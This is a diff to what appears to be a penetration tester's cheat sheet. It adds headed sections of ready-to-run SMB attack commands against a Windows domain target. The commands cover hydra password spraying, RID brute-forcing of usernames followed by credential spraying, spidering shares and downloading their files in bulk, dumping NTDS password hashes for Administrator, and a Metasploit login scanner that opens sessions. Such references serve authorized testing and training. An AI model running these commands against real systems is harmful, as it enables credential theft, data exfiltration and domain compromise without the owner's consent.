@@ -613,20 +613,30 @@ nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=80530636
 godap $TARGET -u '$USERNAME' -p '$PASSWORD' -d '$DOM'
 
 [*] (445) SMB
-
++---------- Spray Service ----------+
 hydra -I smb2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null
 
++---------- Get Shares ----------+
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --shares
+
++---------- Get Users ----------+
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?<=\\)[^ (\n]+(?=.*\(SidTypeUser\))' >> usernames; sort -u usernames | tee usernames; nxc smb "$TARGET" -u usernames -p passwords --continue-on-success
+
++---------- Get Groups ----------+
 nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --groups | grep 'membercount' | cut -d':' -f1 | sed 's/^[^ ]* *[^ ]* *[^ ]* *[^ ]* *//' | sed 's/ *membercount.*//' >> groups
 
++---------- Spider Share for Files ----------+
 NXCSPIDER=$(nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' -M spider_plus | grep -oP '(?<=Saved share-file metadata to ")[^"]+');cat $NXCSPIDER | grep -vE 'epoch|size' | sed -E 's/[{}\",:]//g' | sed '/^        $/d' | tee smbfiles_$USERNAME
+
++---------- Download Files Locally ----------+
 mkdir smb; smbclient //$TARGET/SHARE -N -D . -c 'lcd smb; recurse; prompt; mget *'
 mkdir smb; smbclient //$TARGET/SHARE -U '$USERNAME'%'$PASSWORD' -D . -c 'lcd smb; recurse; prompt; mget *'
 
++---------- NTDS ----------+
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --ntds --user Administrator
 nxc smb $TARGET --use-kcache --ntds --user Administrator
 
++---------- Metasploit ----------+
 msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser $USERNAME; set SMBPass $PASSWORD; set BLANK_PASSWORDS true; set CreateSession true; run"
 sessions -i 1
 shares -i C$
